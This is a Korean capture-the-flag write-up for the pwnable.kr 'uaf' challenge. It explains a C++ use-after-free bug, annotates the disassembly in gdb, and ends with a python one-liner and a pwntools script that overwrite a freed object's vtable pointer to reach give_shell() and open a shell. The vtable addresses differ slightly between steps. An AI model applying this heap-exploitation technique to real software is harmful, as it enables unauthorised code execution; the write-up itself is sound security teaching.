# Toddler's Bottle - uaf
## 문제 설명  
```
Mommy, what is Use After Free bug?  

ssh uaf@pwnable.kr -p2222 (pw:guest)
```  
```
#include <fcntl.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
        virtual void give_shell(){
                system("/bin/sh");
        }
protected:
        int age;
        string name;
public:
        virtual void introduce(){
                cout << "My name is " << name << endl;
                cout << "I am " << age << " years old" << endl;
        }
};

class Man: public Human{
public:
        Man(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
        Human* m = new Man("Jack", 25);
        Human* w = new Woman("Jill", 21);

        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout << "1. use\n2. after\n3. free\n";
                cin >> op;

                switch(op){
                        case 1:
                                m->introduce();
                                w->introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout << "your data is allocated" << endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                                break;
                }
        }

        return 0;
}
```  

## 문제 풀이  
0.  
먼저 소스코드를 보자.  
```
class Human{
private:
        virtual void give_shell(){
                system("/bin/sh");
        }
protected:
        int age;
        string name;
public:
        virtual void introduce(){
                cout << "My name is " << name << endl;
                cout << "I am " << age << " years old" << endl;
        }
};

class Man: public Human{
public:
        Man(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};
```  
Man과 Woman은 Human 구조체를 상속하는 구조체다.  
Human 함수 중에 쉘을 실행하는 ```give_shell()```가 있고,  
Woman과 Man에서 각각 name과 age를 넣어주고,  
가상함수 introduce가 Man과 Woman에서 overwrite 해주고 있다.  

```
Human* m = new Man("Jack", 25);
Human* w = new Woman("Jill", 21);
```  
Human 포인터를 이용해서 Man과 Woman 구조체를 생성해준다.(부모구조체 포인터로 자식 구조체를 만들었다. 이유는 모르겠음)  

```
while(1){
        cout << "1. use\n2. after\n3. free\n";
        cin >> op;

        switch(op){
                case 1:
                        m->introduce();
                        w->introduce();
                        break;
                case 2:
                        len = atoi(argv[1]);
                        data = new char[len];
                        read(open(argv[2], O_RDONLY), data, len);
                        cout << "your data is allocated" << endl;
                        break;
                case 3:
                        delete m;
                        delete w;
                        break;
                default:
                        break;
        }
}
```  
op 변수에 사용자 입력을 받고, 이에 따라 case들을 실행한다.  
**case 1**: introduce 함수 호출  
**case 2**: 사용자에게 data 크기와 내용(파일에서 읽어온 값)을 입력받아 data 할당(동적 할당)  
**case 3**: 구조체 free  

여기서 이제 두 가지 취약점이 발생한다.  
**1)** 구조체를 delete 해주고 m과 w 포인터를 NULL pointer로 바꾸어줘야 하는데, 그러지 않아 그대로 값이 남아있는 메모리 공간을 m과 w이 가리키고 있다는 점  
**2)** case 1에서 m과 w 구조체가 존재하는지 확인을 하지 않는 점  

이러한 점 때문에 m과 w 메모리가 할당되고 free될 때를 이용해 UAF(Use After Free) 공격을 할 수 있다.  

### UAF란?  
Heap 영역에서 발생하는 취약점으로, malloc() 등의 함수로 메모리를 동적할당하고 해제한 후 다시 같은 크기로 메모리 영역을 재사용하게 될 경우 발생하는 취약점이다.  
왜냐하면 힙은 할당을 좀 더 효율적으로 하기 위해 반환된 heap 영역의 크기를 기억해놨다가 같은 크기의 할당 요청이 들어오면 이전 영역을 재사용하기 때문이다.  
free를 한다고 해서 해당 영역이 초기화되는 것이 아니기 때문에,  
이렇게 해제된 공간을 재사용할 경우 이전의 데이터를 참조할 수 있게 되는 것이다.  

-----

1.  
그럼 공격 패턴을 정할 수 있게 된다.  
먼저 m,w 포인터에 할당되어 있는 구조체를 delete를 이용해 free 시킨다. (case 3 실행)  
그리고 free한 구조체 크기만큼 새 데이터를 동적할당 해준다. 이 때 입력 데이터에 익스플로잇 코드를 넣어주면 될 것이다. (case 2 실행)  
이 구조체에 남아있는 값을 조작하여 introduce() 함수를 실행할 때 우리의 공격 코드가 실행되도록 한다. (case 1 실행)  

공격코드는 Human 구조체 있는 get_shell()함수를 실행시키게 만들면 될 것 같다!  
즉, introduce() 함수를 호출할 때 get_shell()가 호출되도록 만드는 것이다.  

-----

2.  
gdb를 이용해 프로그램을 살펴보면서 자세히 알아보자.  
```gdb uaf```  
```disas main```  
함수명이 깨진다면 ```set print asm-demangle on```  

main을 디스어셈블링하면 아래와 같이 나온다. 해석은 주석 참고.  

```
   0x0000000000400ec4 <+0>:     push   %rbp
   0x0000000000400ec5 <+1>:     mov    %rsp,%rbp
   0x0000000000400ec8 <+4>:     push   %r12
   0x0000000000400eca <+6>:     push   %rbx
   0x0000000000400ecb <+7>:     sub    $0x50,%rsp
   0x0000000000400ecf <+11>:    mov    %edi,-0x54(%rbp)
   0x0000000000400ed2 <+14>:    mov    %rsi,-0x60(%rbp)
   0x0000000000400ed6 <+18>:    lea    -0x12(%rbp),%rax
   0x0000000000400eda <+22>:    mov    %rax,%rdi
   // man 인스턴스 생성
   0x0000000000400edd <+25>:    callq  0x400d70 <std::allocator<char>::allocator()@plt>
   0x0000000000400ee2 <+30>:    lea    -0x12(%rbp),%rdx
   0x0000000000400ee6 <+34>:    lea    -0x50(%rbp),%rax
   0x0000000000400eea <+38>:    mov    $0x4014f0,%esi
   0x0000000000400eef <+43>:    mov    %rax,%rdi
   0x0000000000400ef2 <+46>:    callq  0x400d10 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocato                  r<char> const&)@plt>
   0x0000000000400ef7 <+51>:    lea    -0x50(%rbp),%r12
   0x0000000000400efb <+55>:    mov    $0x18,%edi  // 구조체 크기는 0x18
   0x0000000000400f00 <+60>:    callq  0x400d90 <operator new(unsigned long)@plt>
   0x0000000000400f05 <+65>:    mov    %rax,%rbx  // 구조체 인자들 넣어주기
   0x0000000000400f08 <+68>:    mov    $0x19,%edx
   0x0000000000400f0d <+73>:    mov    %r12,%rsi
   0x0000000000400f10 <+76>:    mov    %rbx,%rdi
   0x0000000000400f13 <+79>:    callq  0x401264 <Man::Man(std::string, int)>
   0x0000000000400f18 <+84>:    mov    %rbx,-0x38(%rbp)
   0x0000000000400f1c <+88>:    lea    -0x50(%rbp),%rax
   0x0000000000400f20 <+92>:    mov    %rax,%rdi
   0x0000000000400f23 <+95>:    callq  0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
   0x0000000000400f28 <+100>:   lea    -0x12(%rbp),%rax
   0x0000000000400f2c <+104>:   mov    %rax,%rdi
   0x0000000000400f2f <+107>:   callq  0x400d40 <std::allocator<char>::~allocator()@plt>
   0x0000000000400f34 <+112>:   lea    -0x11(%rbp),%rax
   0x0000000000400f38 <+116>:   mov    %rax,%rdi
   // woman 인스턴스 생성
   0x0000000000400f3b <+119>:   callq  0x400d70 <std::allocator<char>::allocator()@plt>
   0x0000000000400f40 <+124>:   lea    -0x11(%rbp),%rdx
   0x0000000000400f44 <+128>:   lea    -0x40(%rbp),%rax
   0x0000000000400f48 <+132>:   mov    $0x4014f5,%esi
   0x0000000000400f4d <+137>:   mov    %rax,%rdi
   0x0000000000400f50 <+140>:   callq  0x400d10 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&)@plt>
   0x0000000000400f55 <+145>:   lea    -0x40(%rbp),%r12
   0x0000000000400f59 <+149>:   mov    $0x18,%edi
   0x0000000000400f5e <+154>:   callq  0x400d90 <operator new(unsigned long)@plt>
   0x0000000000400f63 <+159>:   mov    %rax,%rbx
   0x0000000000400f66 <+162>:   mov    $0x15,%edx
   0x0000000000400f6b <+167>:   mov    %r12,%rsi
   0x0000000000400f6e <+170>:   mov    %rbx,%rdi
   0x0000000000400f71 <+173>:   callq  0x401308 <Woman::Woman(std::string, int)>
   0x0000000000400f76 <+178>:   mov    %rbx,-0x30(%rbp)
   0x0000000000400f7a <+182>:   lea    -0x40(%rbp),%rax
   0x0000000000400f7e <+186>:   mov    %rax,%rdi
   0x0000000000400f81 <+189>:   callq  0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
   0x0000000000400f86 <+194>:   lea    -0x11(%rbp),%rax
   0x0000000000400f8a <+198>:   mov    %rax,%rdi
   0x0000000000400f8d <+201>:   callq  0x400d40 <std::allocator<char>::~allocator()@plt>
   0x0000000000400f92 <+206>:   mov    $0x4014fa,%esi
   0x0000000000400f97 <+211>:   mov    $0x602260,%edi
   
   //음 뭔가 op 변수 가져오는 것 같음
   0x0000000000400f9c <+216>:   callq  0x400cf0 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
   0x0000000000400fa1 <+221>:   lea    -0x18(%rbp),%rax
   0x0000000000400fa5 <+225>:   mov    %rax,%rsi
   0x0000000000400fa8 <+228>:   mov    $0x6020e0,%edi
   0x0000000000400fad <+233>:   callq  0x400dd0 <std::istream::operator>>(unsigned int&)@plt>
   0x0000000000400fb2 <+238>:   mov    -0x18(%rbp),%eax
   
   // case 2
   0x0000000000400fb5 <+241>:   cmp    $0x2,%eax
   0x0000000000400fb8 <+244>:   je     0x401000 <main+316>
   // case 3
   0x0000000000400fba <+246>:   cmp    $0x3,%eax
   0x0000000000400fbd <+249>:   je     0x401076 <main+434>
   // case 1
   0x0000000000400fc3 <+255>:   cmp    $0x1,%eax
   0x0000000000400fc6 <+258>:   je     0x400fcd <main+265>
   0x0000000000400fc8 <+260>:   jmpq   0x4010a9 <main+485>
   0x0000000000400fcd <+265>:   mov    -0x38(%rbp),%rax  // rax에 rbp-0x38 에 있는 값 넣어주고
   0x0000000000400fd1 <+269>:   mov    (%rax),%rax  // rax가 가리키는 값을 rax에 넣고
   0x0000000000400fd4 <+272>:   add    $0x8,%rax  // rax+8을 한다.
   0x0000000000400fd8 <+276>:   mov    (%rax),%rdx  // 그리고 rax+8이 가리키는 값을 가져오고
   0x0000000000400fdb <+279>:   mov    -0x38(%rbp),%rax // rax에 rbp-0x38을 넣어주고
   0x0000000000400fdf <+283>:   mov    %rax,%rdi
   0x0000000000400fe2 <+286>:   callq  *%rdx   // 이게 introduce() 호출
   0x0000000000400fe4 <+288>:   mov    -0x30(%rbp),%rax
   0x0000000000400fe8 <+292>:   mov    (%rax),%rax
   0x0000000000400feb <+295>:   add    $0x8,%rax
   0x0000000000400fef <+299>:   mov    (%rax),%rdx
   0x0000000000400ff2 <+302>:   mov    -0x30(%rbp),%rax
   0x0000000000400ff6 <+306>:   mov    %rax,%rdi
   0x0000000000400ff9 <+309>:   callq  *%rdx  // introduce() 호출
   0x0000000000400ffb <+311>:   jmpq   0x4010a9 <main+485>
   0x0000000000401000 <+316>:   mov    -0x60(%rbp),%rax
   0x0000000000401004 <+320>:   add    $0x8,%rax
   0x0000000000401008 <+324>:   mov    (%rax),%rax
   0x000000000040100b <+327>:   mov    %rax,%rdi
   0x000000000040100e <+330>:   callq  0x400d20 <atoi@plt>
   0x0000000000401013 <+335>:   cltq
   0x0000000000401015 <+337>:   mov    %rax,-0x28(%rbp)
   0x0000000000401019 <+341>:   mov    -0x28(%rbp),%rax
   0x000000000040101d <+345>:   mov    %rax,%rdi
   0x0000000000401020 <+348>:   callq  0x400c70 <operator new[](unsigned long)@plt>
   0x0000000000401025 <+353>:   mov    %rax,-0x20(%rbp)
   0x0000000000401029 <+357>:   mov    -0x60(%rbp),%rax
   0x000000000040102d <+361>:   add    $0x10,%rax
   0x0000000000401031 <+365>:   mov    (%rax),%rax
   0x0000000000401034 <+368>:   mov    $0x0,%esi
   0x0000000000401039 <+373>:   mov    %rax,%rdi
   0x000000000040103c <+376>:   mov    $0x0,%eax
   0x0000000000401041 <+381>:   callq  0x400dc0 <open@plt>
   0x0000000000401046 <+386>:   mov    -0x28(%rbp),%rdx
   0x000000000040104a <+390>:   mov    -0x20(%rbp),%rcx
   0x000000000040104e <+394>:   mov    %rcx,%rsi
   0x0000000000401051 <+397>:   mov    %eax,%edi
   0x0000000000401053 <+399>:   callq  0x400ca0 <read@plt>
   0x0000000000401058 <+404>:   mov    $0x401513,%esi
   0x000000000040105d <+409>:   mov    $0x602260,%edi
   0x0000000000401062 <+414>:   callq  0x400cf0 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
   0x0000000000401067 <+419>:   mov    $0x400d60,%esi
   0x000000000040106c <+424>:   mov    %rax,%rdi
   0x000000000040106f <+427>:   callq  0x400d50 <std::ostream::operator<<(std::ostream& (*)(std::ostream&))@plt>
   0x0000000000401074 <+432>:   jmp    0x4010a9 <main+485>
   // m delete
   0x0000000000401076 <+434>:   mov    -0x38(%rbp),%rbx
   0x000000000040107a <+438>:   test   %rbx,%rbx
   0x000000000040107d <+441>:   je     0x40108f <main+459>
   0x000000000040107f <+443>:   mov    %rbx,%rdi
   0x0000000000401082 <+446>:   callq  0x40123a <Human::~Human()>
   0x0000000000401087 <+451>:   mov    %rbx,%rdi
   0x000000000040108a <+454>:   callq  0x400c80 <operator delete(void*)@plt>
   // w delete
   0x000000000040108f <+459>:   mov    -0x30(%rbp),%rbx
   0x0000000000401093 <+463>:   test   %rbx,%rbx
   0x0000000000401096 <+466>:   je     0x4010a8 <main+484>
   0x0000000000401098 <+468>:   mov    %rbx,%rdi
   0x000000000040109b <+471>:   callq  0x40123a <Human::~Human()>
   0x00000000004010a0 <+476>:   mov    %rbx,%rdi
   0x00000000004010a3 <+479>:   callq  0x400c80 <operator delete(void*)@plt>
   // break
   0x00000000004010a8 <+484>:   nop
   0x00000000004010a9 <+485>:   jmpq   0x400f92 <main+206>
   
   0x00000000004010ae <+490>:   mov    %rax,%r12
   0x00000000004010b1 <+493>:   mov    %rbx,%rdi
   0x00000000004010b4 <+496>:   callq  0x400c80 <operator delete(void*)@plt>
   0x00000000004010b9 <+501>:   mov    %r12,%rbx
   0x00000000004010bc <+504>:   jmp    0x4010c1 <main+509>
   0x00000000004010be <+506>:   mov    %rax,%rbx
   0x00000000004010c1 <+509>:   lea    -0x50(%rbp),%rax
   0x00000000004010c5 <+513>:   mov    %rax,%rdi
   0x00000000004010c8 <+516>:   callq  0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
   0x00000000004010cd <+521>:   jmp    0x4010d2 <main+526>
   0x00000000004010cf <+523>:   mov    %rax,%rbx
   0x00000000004010d2 <+526>:   lea    -0x12(%rbp),%rax
   0x00000000004010d6 <+530>:   mov    %rax,%rdi
   0x00000000004010d9 <+533>:   callq  0x400d40 <std::allocator<char>::~allocator()@plt>
   0x00000000004010de <+538>:   mov    %rbx,%rax
   0x00000000004010e1 <+541>:   mov    %rax,%rdi
   0x00000000004010e4 <+544>:   callq  0x400da0 <_Unwind_Resume@plt>
   0x00000000004010e9 <+549>:   mov    %rax,%r12
   0x00000000004010ec <+552>:   mov    %rbx,%rdi
   0x00000000004010ef <+555>:   callq  0x400c80 <operator delete(void*)@plt>
   0x00000000004010f4 <+560>:   mov    %r12,%rbx
   0x00000000004010f7 <+563>:   jmp    0x4010fc <main+568>
   0x00000000004010f9 <+565>:   mov    %rax,%rbx
   0x00000000004010fc <+568>:   lea    -0x40(%rbp),%rax
   0x0000000000401100 <+572>:   mov    %rax,%rdi
   0x0000000000401103 <+575>:   callq  0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
   0x0000000000401108 <+580>:   jmp    0x40110d <main+585>
   0x000000000040110a <+582>:   mov    %rax,%rbx
   0x000000000040110d <+585>:   lea    -0x11(%rbp),%rax
   0x0000000000401111 <+589>:   mov    %rax,%rdi
   0x0000000000401114 <+592>:   callq  0x400d40 <std::allocator<char>::~allocator()@plt>
   0x0000000000401119 <+597>:   mov    %rbx,%rax
   0x000000000040111c <+600>:   mov    %rax,%rdi
   0x000000000040111f <+603>:   callq  0x400da0 <_Unwind_Resume@plt>
```


```
Free 	Index 	Content		Size
F 	0 	data		100
F 	1 	Human *w	100
F 	2	
F 	3
.
.
.

+-Object------+      +-vtable--------------+
| *vtable     +--?-->| virtual function #1 |
+-------------+      | virtual function #2 +----> give_shell()
| member      |      +---------------------+
| ...         |
+-------------+

Human::vtable
  0x401560 NULL
> 0x401568 typeinfo
  0x401570 give_shell()
  0x401578 introduce()

Human *m = 0x01fe9010
0x01fe9010 *vtable = 0x401568
0x01fe9018 member
...

char *data = 0x01fe9010
0x01fe9010 *vtable = 0x401568

24 byte를 할당해서 크기를 잡아주고 값은 8byte만 채운다.  
주소를 넣어주면 위에서부터 채워지므로 m의 vtable에 해당 주소가 들어가게 된다!
참고로 주소는 원래 64bit 체계라 8byte라서 0x00 00 00 00 01 fe 90 10 이지만 4byte인 01 fe 90 10 으로 써도 알아서 들어간다.  

8byte만 바꿔주면 되니까~ 나머지는 원래값 그대로 남아 있다.  
```


```python -c 'print "\x68\x15\x40\x00"' > /tmp/uaf/input```  
```./uaf 24 /tmp/uaf/input```  
그리고 차례로 3, 2, 2, 1 입력! 한

```
#!/usr/bin/python3

from pwn import *

''' Create file '''
size = 0x18
path = "/tmp/uaf_file"
data = p64(0x401588) * 3
with open(path, 'wb') as f:
    f.write(data)

''' Spawn process '''
p = process(["uaf", str(size), path])
input("> ")

''' Inputs '''
def use():
    p.sendline("1")

def after():
    p.sendline("2")

def free():
    p.sendline("3")

''' Exploit '''
if __name__ == '__main__':
    free()
    after()
    after()
    use()
    p.interactive()
```  
